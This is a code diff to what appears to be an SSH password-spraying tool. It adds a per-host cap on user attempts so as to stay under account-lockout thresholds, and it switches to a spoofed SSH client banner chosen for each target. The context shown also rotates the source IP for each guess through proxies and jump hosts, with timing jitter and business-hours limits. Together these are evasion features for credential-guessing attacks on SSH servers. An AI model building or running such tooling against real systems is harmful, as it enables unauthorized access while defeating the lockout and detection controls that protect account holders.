@@ -42,7 +42,7 @@ from honeywatch.opsec import (
     attempt_sshpass,
     auth_methods,
     sleep_with_jitter,
-    spoofed_ssh_banner,
+    spoofed_ssh_banner_for_target,
     within_business_hours,
 )
 
@@ -84,6 +84,10 @@ class SprayPlan:
     skip_publickey_only: bool = True
     # Stop a host the moment one of its users accepts the password (default).
     stop_on_success: bool = True
+    # Per-host user attempt cap (Finding #6): stop the round on a host after
+    # this many users have been tried, regardless of success/failure. Matches
+    # common PAM maxretry (default 5). 0 = unbounded.
+    max_user_attempts: int = 0
 
 
 @dataclass
@@ -162,6 +166,13 @@ async def _spray_host(
         res.attempts = 0
 
     for user in host.users:
+        # Per-user attempt cap (Finding #6): stop the round after max_user_attempts
+        # users have been tried to avoid tripping account-lockout policies. The
+        # next password round starts fresh. Matches common PAM maxretry (default 5).
+        if plan.max_user_attempts > 0 and res.attempts >= plan.max_user_attempts:
+            res.skipped = True
+            res.skip_reason = f"user cap reached ({plan.max_user_attempts}); waiting for lockout window"
+            return res
         # Per-attempt source rotation: each guess egresses from a different IP.
         rot = pool.next() if pool else {"proxy": None, "jump": None}
         proxy = rot.get("proxy")
@@ -246,7 +257,7 @@ def _paramiko_attempt_sync(
         # Bound blocking transport reads (incl. auth_password) so a hung
         # server stalls only this attempt, not the whole event loop slot.
         t.set_timeout(timeout_s)
-        banner = spoofed_ssh_banner()
+        banner = spoofed_ssh_banner_for_target(ip, port)
         try:
             t._CLIENT_IDENTITY = banner
         except Exception:
@@ -362,6 +373,7 @@ def spray_targets(
     proxy_file: str | None = None,
     jump_file: str | None = None,
     use_sshpass: bool | None = None,
+    max_user_attempts: int = 0,
     on_result=None,
     on_attempt=None,
 ) -> list[SprayResult]:
@@ -375,6 +387,7 @@ def spray_targets(
         lockout_delay=lockout_delay,
         business_hours=business_hours,
         skip_publickey_only=skip_publickey_only,
+        max_user_attempts=max_user_attempts,
     )
     return asyncio.run(
         spray_plan(plan, pool=pool, host_concurrency=host_concurrency,
